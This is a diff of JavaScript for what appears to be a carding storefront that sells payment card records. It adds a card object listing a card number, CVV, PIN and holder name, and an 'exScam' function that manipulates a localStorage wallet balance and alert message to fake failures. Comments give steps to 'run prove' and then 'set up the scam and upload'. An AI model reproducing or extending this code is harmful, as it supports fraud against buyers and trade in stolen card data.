@@ -22007,33 +22007,94 @@
       }
     ];
 
-   
-    /** 
-    // modified card is an original card to scm
-    let card = {
-      "data": {
-        "card": {
-          "network": "Mastercard",
-          "number": "2706 8281 0241 0005",
-          "cvv": 655,
-          "pin": 7244,
-          "balance": "$900",
-          "expirationMonth": 7,
-          "expirationYear": "2025",
-          "price": 14.94,
-          "id": 0
-        },
-        "customer": {
-          "name": "Kofi Mensah",
-          "address": "South Street 9949",
-          "country": "Benin"
+
+    function addOriCard(){
+      let oriCard = {
+        "data": {
+          "card": {
+            "network": "Visa",
+            "number": "4305 4500 3913 5711",
+            "cvv": 655,
+            "pin": 7244,
+            "balance": "$900",
+            "expirationMonth": 7,
+            "expirationYear": "2021",
+            "price": 5.23,
+            "id": -1
+          },
+          "customer": {
+            "name": "Abraham Agortey",
+            "address": "South Street 9949",
+            "country": "Benin"
+          }
         }
       }
+  
+      cardObjects.push(oriCard);
     }
-    cardObjects.push(card);
+   // addOriCard();
 
-    **/
+        //execute to run scam
+        let exScam = function (scamAmount,testAmount){
+          setWalletAmount(scamAmount);
+          showWalletAmount();
+
+         if (scamAmount > 0){
+          
+           //set alertMessage
+           localStorage.setItem("alertMessage","failed");
+
+         }else{
+
+
+
+          localStorage.removeItem("alertMessage");
+          
+          setWalletAmount(testAmount);
+          showWalletAmount(); 
+
+         }
+
+
+         
+          
+
+
+          // wallet second time creation of these function
+            function setWalletAmount(amount=0){
+              localStorage.setItem('walletAmount',amount);
+            }
+            function showWalletAmount(){
+              let amount = localStorage.getItem('walletAmount');
+              $(".wallet").html(` Wallet: $ ${amount}`);
+
+              if ( amount === null){
+                $(".wallet").html(` Wallet: $ 0.00`);
+              }
+            }
+
+        };
+        //set the first argument to 0 and the second to any numb > 0 to run prove
+        //after that  set both values to (0,0) to set up the scam and upload
+        exScam(0,0);
+
+       
+        
+
       localStorage.setItem("cardObjects",JSON.stringify(cardObjects));
+
+
+
+
+
+      //number generators
+      function getNumBetween (num1 , num2){
+        let min = num1
+        let max = num2
+        let randomNum = (Math.random() * (max - min + 1)) + min;
+
+        return randomNum.toFixed(2);
+      }
 
   })();
 
